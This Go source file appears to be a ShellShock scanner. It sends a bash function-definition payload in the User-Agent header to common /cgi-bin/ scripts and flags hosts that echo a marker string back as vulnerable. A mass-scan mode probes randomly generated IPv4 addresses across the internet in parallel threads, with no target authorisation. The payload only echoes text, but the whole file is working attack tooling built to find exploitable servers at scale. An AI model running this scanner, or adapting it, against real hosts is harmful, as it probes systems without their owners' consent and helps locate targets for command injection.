/*
	ShellShock scanner

	TODO: seguir directory indexings
*/

package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

var cgis = []string{
	"printenv",
	"env",
	"ps",
	"test",
	"ps",
	"environ",
	"environment",
	"sys",
	"sysinfo",
}

var silent *bool

func genIP() string {
	var o [4]int

	rand.Seed(time.Now().UnixNano())

	for i := 0; i < 4; i++ {
		o[i] = rand.Intn(255)
	}
	return strconv.Itoa(o[0]) + "." + strconv.Itoa(o[1]) + "." + strconv.Itoa(o[2]) + "." + strconv.Itoa(o[3])
}

func check(err error, msg string) {
	if err != nil {
		fmt.Println(msg)
		os.Exit(1)
	}
}

func get(url string) bool {
	var client = &http.Client{}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		if !*silent {
			log.Printf("Cant resolve %s\n", url)
		}
		return false
	}
	req.Header.Set("User-Agent", "() { foo;};echo; echo 'iwejf''oeijf'")
	resp, err := client.Do(req)
	if err != nil {
		if !*silent {
			log.Printf("Cant connect %s\n", url)
		}
		return false
	}

	defer resp.Body.Close()
	if !*silent {
		log.Printf(" [%d] %s\n", resp.StatusCode, url)
	}

	if resp.StatusCode == 200 {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			if !*silent {
				log.Println("Bad data ..")
			}
		} else {
			if strings.Contains(string(body), "iwejfoeijf") {
				log.Printf("Fuck yeah!!! vulnerable: %s\n", url)
			}
		}
	}

	return true
}

func scanHost(host string) {

	if !get("http://" + host + "/cgi-bin/") {
		return
	}

	for _, cgi := range cgis {
		get("http://" + host + "/cgi-bin/" + cgi)
		get("http://" + host + "/cgi-bin/" + cgi + ".cgi")
		get("http://" + host + "/cgi-bin/" + cgi + ".pl")
	}

}

func main() {
	var i int
	var host *string = flag.String("check", "", "host to check")
	var scan *int = flag.Int("scan", -1, "mass scan mode, provide the num of threads")
	silent = flag.Bool("silent", false, "only show vulnerable urls")
	flag.Parse()

	if *scan == -1 && *host == "" {
		fmt.Println("use --help to see the correct flags")
		os.Exit(1)
	}

	if *host != "" {
		scanHost(*host)
		os.Exit(1)
	}

	log.Println("Scanning Internet, press enter to stop ...")

	for i = 0; i < *scan; i++ {
		go func() {
			for {
				scanHost(genIP())
			}
		}()
	}

	fmt.Scanf("%d", &i)

}
